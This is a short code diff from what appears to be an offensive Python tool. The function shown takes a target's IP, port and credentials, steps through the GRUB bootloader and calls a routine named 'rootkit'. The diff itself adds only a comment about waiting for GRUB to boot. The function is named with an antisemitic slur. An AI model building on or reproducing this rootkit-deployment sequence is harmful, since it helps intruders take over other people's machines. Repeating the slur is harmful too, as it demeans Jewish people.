@@ -75,6 +75,7 @@ async def jew(ip, port, username, password):
             await grub_enter(client)
             await grub_boot(client)
             await rootkit(client)
+            # we might want to wait 2 minutes then press enter here, for when grub doesnt boot automaticall
     except:
         return
 
